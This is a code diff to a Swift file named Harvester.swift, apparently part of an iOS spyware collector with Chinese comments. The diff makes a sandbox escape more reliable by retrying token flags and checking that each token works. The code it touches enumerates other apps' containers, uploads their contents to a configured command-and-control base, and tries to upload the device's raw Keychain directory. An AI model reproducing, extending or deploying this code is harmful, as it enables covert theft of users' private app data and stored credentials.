@@ -1,5 +1,8 @@
 //
-//  Harvester.swift — 全自动采集核心（class，避免 SwiftUI 结构体闭包捕获问题）
+//  Harvester.swift — 全自动采集核心
+//
+//  与上游 WQFiles 一致：token 查询先试标准 flags，失败再试 alt；
+//  并且用 open() 验证 token 是否真的生效（否则换 flags）。
 //
 import Foundation
 import Combine
@@ -25,6 +28,10 @@ final class Harvester: ObservableObject {
     var deviceID = UIDevice.current.identifierForVendor?.uuidString
         ?? "collector-\(UIDevice.current.systemVersion)"
 
+    /// 记住可用的 flags 组合，避免每个容器都试两遍
+    private var preferredAlt: Bool? = nil
+    private(set) var lastFlags = "unknown"
+
     init() {}
 
     func configure(c2Base: String, groupID: String, fullMode: Bool, autoMinutes: Int) {
@@ -47,6 +54,38 @@ final class Harvester: ObservableObject {
         guard let u = c.url else { return }
         URLSession.shared.dataTask(with: u).resume()
     }
+
+    // MARK: - 逃逸（带 flags 回退 + 生效校验）
+
+    private func canOpen(_ p: String) -> Bool {
+        let fd = open(p, O_RDONLY | O_NOFOLLOW)
+        if fd >= 0 { close(fd); return true }
+        return errno != EPERM
+    }
+
+    private func escape(_ path: String, group g: String, quiet: Bool = true) -> Int64 {
+        let order: [Bool]
+        if let p = preferredAlt { order = [p, !p] } else { order = [false, true] }
+        var last: Int64 = -999
+        for alt in order {
+            let h = worse_query(path, g, alt, false)
+            if h > 0 {
+                if canOpen(path) {
+                    preferredAlt = alt
+                    lastFlags = alt ? "alt" : "standard"
+                    return h
+                }
+                worse_query_release(h)
+                last = -8
+                if !quiet { log("token 未能打开目标（\(alt ? "alt" : "standard")），换另一组 flags") }
+            } else {
+                last = h
+            }
+        }
+        return last
+    }
+
+    // MARK: - 主流程
 
     func run() {
         if running { return }
@@ -71,10 +110,10 @@ final class Harvester: ObservableObject {
         DispatchQueue.global().async { [weak self] in
             guard let self = self else { return }
 
-            // 1) 逃逸
-            let h = worse_query(root, g, true, false)
+            // 1) 逃逸（root 目录）
+            let h = self.escape(root, group: g, quiet: false)
             if h > 0 {
-                self.log("✅ 沙盒逃逸 OK（handle=\(h)）")
+                self.log("✅ 沙盒逃逸 OK（flags=\(self.lastFlags), handle=\(h)）")
                 worse_query_release(h)
             } else {
                 self.log("❌ 沙盒逃逸失败 code=\(h)，仍尝试枚举")
@@ -95,7 +134,7 @@ final class Harvester: ObservableObject {
             // 3) 识别 bundle
             var targets: [ContainerTarget] = []
             for p in paths {
-                let hh = worse_query(p, g, true, false)
+                let hh = self.escape(p, group: g)
                 guard hh > 0 else { continue }
                 var buf = [CChar](repeating: 0, count: 512)
                 let n = getxattr(p, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
@@ -131,7 +170,7 @@ final class Harvester: ObservableObject {
         }
         let t = list[index]
         DispatchQueue.main.async { self.phase = "上传 \(index + 1)/\(list.count) \(t.bundle)" }
-        let h = worse_query(t.path, g, true, false)
+        let h = escape(t.path, group: g)
         guard h > 0 else {
             log("跳过 \(t.bundle)（扩展失败 \(h)）")
             return uploadAll(list, index: index + 1, up: up, group: g)
@@ -154,12 +193,12 @@ final class Harvester: ObservableObject {
     /// 尝试导出 Keychain 密文库（多数会被拒，仅记录）
     private func tryKeychain(up: Uploader, group g: String) {
         let kc = "/var/mobile/Library/Keychains"
-        let h = worse_query(kc, g, false, false)
+        let h = escape(kc, group: g)
         guard h > 0 else {
             log("Keychain 不可访问（code=\(h)）：种子在 Keychain，容器逃逸到不了")
             return
         }
-        log("Keychain 目录可访问（handle=\(h)），尝试上传密文库")
+        log("Keychain 目录可访问（handle=\(h), flags=\(lastFlags)），尝试上传密文库")
         up.uploadTree(URL(fileURLWithPath: kc), category: "keychain-raw",
                       maxBytes: 32 * 1024 * 1024,
                       onEach: { _ in }, progress: { _, _ in }) { ok, fail in
